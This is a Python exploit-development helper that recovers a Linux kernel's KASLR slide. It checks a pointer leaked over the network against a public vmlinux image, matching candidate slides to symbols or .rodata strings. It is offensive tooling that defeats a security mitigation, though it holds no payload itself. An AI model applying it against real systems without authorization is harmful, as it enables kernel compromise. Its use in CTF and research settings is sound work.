#!/usr/bin/env python3
"""wire_slide.py <leaked_ptr> [vmlinux] - resolve KASLR slide from a pointer
leaked over the wire, using the public kernel image.

For each 2 MiB-aligned slide, static = leaked - slide; if that static address
falls in a mapped section and points at a printable string (a leaked .rodata
string pointer) or exactly at a text symbol (a leaked function pointer), the
candidate is reported.  Usage: wire_slide.py 0xffffffff8fa27a28
"""
import struct, sys, subprocess
LEAK=int(sys.argv[1],0); VML=sys.argv[2] if len(sys.argv)>2 else '/tmp/vmlinux-6.8.elf'
d=open(VML,'rb').read(); e=d[:64]
shoff=struct.unpack_from('<Q',e,0x28)[0]; shent=struct.unpack_from('<H',e,0x3a)[0]; shnum=struct.unpack_from('<H',e,0x3c)[0]; shstr=struct.unpack_from('<H',e,0x3e)[0]
secs=[]
for i in range(shnum):
    sh=d[shoff+i*shent:shoff+(i+1)*shent]
    nm=struct.unpack_from('<I',sh,0)[0]; typ=struct.unpack_from('<I',sh,4)[0]
    addr=struct.unpack_from('<Q',sh,0x10)[0]; off=struct.unpack_from('<Q',sh,0x18)[0]; size=struct.unpack_from('<Q',sh,0x20)[0]
    secs.append((nm,typ,addr,off,size))
f=d[shoff+shstr*shent:shoff+(shstr+1)*shent]; stroff=struct.unpack_from('<Q',f,0x18)[0]
names=d[stroff:]
def sname(nm):
    return names[nm:names.index(b'\0',nm)].decode(errors='replace')
def read_va(va,n):
    for nm,typ,addr,off,size in secs:
        if typ!=8 and addr<=va<addr+size:
            return d[off+(va-addr):off+(va-addr)+n], sname(nm)
    return None,None
# text symbols for exact hits
syms={}
try:
    out=subprocess.check_output(['nm','-n',VML],stderr=subprocess.DEVNULL).decode(errors='replace')
    for l in out.splitlines():
        p=l.split()
        if len(p)>=3:
            try: syms[int(p[0],16)]=p[2]
            except: pass
except Exception: pass
cands=[]
for slide in range(0, 0x40000000+1, 0x200000):
    st=LEAK-slide
    if st<=0: continue
    if st in syms:
        cands.append((slide,st,'SYMBOL '+syms[st])); continue
    b,sec=read_va(st,24)
    if b:
        pr=sum(1 for c in b if 32<=c<127 or c==0)
        if pr>=18:
            cands.append((slide,st,'str in %s: %r'%(sec,b[:16])))
for s,st,why in cands[:20]:
    print("slide=%#010x static=%#x %s"%(s,st,why))
print("candidates:",len(cands))
